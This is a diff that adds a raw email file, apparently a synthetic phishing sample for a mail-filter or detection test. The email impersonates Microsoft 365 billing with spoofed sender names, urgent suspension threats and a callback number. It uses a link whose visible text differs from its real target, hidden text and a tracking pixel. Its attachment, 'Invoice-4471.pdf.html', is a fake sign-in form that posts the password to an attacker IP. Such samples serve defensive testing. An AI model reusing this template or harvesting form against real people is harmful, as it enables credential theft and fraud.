@@ -1,0 +1,94 @@
+Received: from mx1.yourcompany.example (10.20.0.5) by mbx3.yourcompany.example
+ (10.20.0.12) with Microsoft SMTP Server (version=TLS1_2,
+ cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.20.9000.1; Tue, 15 Sep
+ 2026 14:03:12 +0000
+Received: from mail-relay.example.net (mail-relay.example.net [203.0.113.45])
+ by mx1.yourcompany.example (Postfix) with ESMTPS id 7A1C2E3F4B
+ for <jane.doe@yourcompany.example>; Tue, 15 Sep 2026 14:03:10 +0000
+Received: from [198.51.100.77] (unknown [198.51.100.77])
+ by mail-relay.example.net (Postfix) with ESMTPA id 4F1B9C0D2E;
+ Tue, 15 Sep 2026 13:58:41 +0000
+Authentication-Results: mx1.yourcompany.example;
+ spf=pass (sender IP is 203.0.113.45) smtp.mailfrom=mail-relay.example.net;
+ dkim=pass (signature was verified) header.d=mail-relay.example.net header.s=sel1;
+ dmarc=fail action=quarantine header.from=yourcompany-billing.example;
+ compauth=fail reason=000
+Received-SPF: Pass (mx1.yourcompany.example: domain of bounce@mail-relay.example.net
+ designates 203.0.113.45 as permitted sender) client-ip=203.0.113.45;
+ envelope-from=bounce@mail-relay.example.net; helo=mail-relay.example.net;
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=mail-relay.example.net;
+ s=sel1; t=1789480721; h=from:subject:date:message-id:to:mime-version:content-type;
+ bh=Q2hlY2tzdW1PZlRoZUJvZHlHb2VzSGVyZQ==; b=RmFrZVNpZ25hdHVyZUZvclRlc3RpbmdPbmx5
+X-Originating-IP: [198.51.100.77]
+X-Mailer: PHPMailer 6.9.1 (https://github.com/PHPMailer/PHPMailer)
+X-MS-Exchange-Organization-AuthAs: Anonymous
+X-MS-Exchange-Organization-SCL: 5
+X-Forefront-Antispam-Report: CIP:203.0.113.45;CTRY:XX;LANG:en;SCL:5;SRV:;IPV:NLI;SFV:SPM;H:mail-relay.example.net;PTR:mail-relay.example.net;CAT:PHSH;SFS:(13230040)(1800799024);DIR:INB;
+From: "Microsoft 365 Billing <billing@microsoft.com>" <billing@yourcompany-billing.example>
+Reply-To: accounts.receivable@invoice-desk.example.org
+To: Jane Doe <jane.doe@yourcompany.example>
+Subject: ACTION REQUIRED: Invoice 4471 past due - account will be suspended today
+Date: Tue, 15 Sep 2026 09:58:37 -0400
+Message-ID: <20260915135837.4F1B9C0D2E@srv-01.hosting-panel.example.org>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="----=_Part_0001_1694786321"
+
+------=_Part_0001_1694786321
+Content-Type: multipart/alternative; boundary="----=_Part_0002_1694786321"
+
+------=_Part_0002_1694786321
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: 7bit
+
+Dear Jane,
+
+Our records show invoice 4471 for your Microsoft 365 subscription is past due.
+Your account will be suspended today unless payment is confirmed immediately.
+
+Review the invoice and confirm payment here:
+https://login-yourcompany.example/auth/verify?u=jane.doe@yourcompany.example
+
+If you believe this is an error, call our billing support line at +1 (555) 013-4471
+before 5 PM to cancel the charge and avoid the auto-renew fee.
+
+Regards,
+Billing Department
+
+------=_Part_0002_1694786321
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: 7bit
+
+<html>
+<head><title>Invoice 4471</title></head>
+<body>
+<p>Dear Jane,</p>
+<p>Our records show invoice 4471 for your Microsoft 365 subscription is <b>past due</b>.
+Your account will be suspended <b>today</b> unless payment is confirmed immediately.</p>
+<p>Review the invoice and confirm payment here:<br>
+<a href="https://nam02.safelinks.protection.outlook.com/?url=https%3A%2F%2Flogin-yourcompany.example%2Fauth%2Fverify%3Fu%3Djane.doe%40yourcompany.example&amp;data=05%7C01%7C&amp;reserved=0">https://portal.office.com/account/billing</a></p>
+<p>If you believe this is an error, call our billing support line at +1 (555) 013-4471
+before 5 PM to cancel the charge and avoid the auto-renew fee.</p>
+<p style="font-size:0px;color:#ffffff">ref 8812-invoice-4471-unsubscribe</p>
+<img src="http://track.invoice-desk.example.org/o/4471.gif" width="1" height="1">
+<p>Regards,<br>Billing Department</p>
+</body>
+</html>
+
+------=_Part_0002_1694786321--
+
+------=_Part_0001_1694786321
+Content-Type: text/html; name="Invoice-4471.pdf.html"
+Content-Transfer-Encoding: 7bit
+Content-Disposition: attachment; filename="Invoice-4471.pdf.html"
+
+<html><body>
+<h3>Invoice 4471</h3>
+<p>Sign in to view this document.</p>
+<form method="post" action="http://198.51.100.77/collect.php">
+<input type="text" name="email" value="jane.doe@yourcompany.example">
+<input type="password" name="pass">
+<input type="submit" value="Open document">
+</form>
+</body></html>
+
+------=_Part_0001_1694786321--
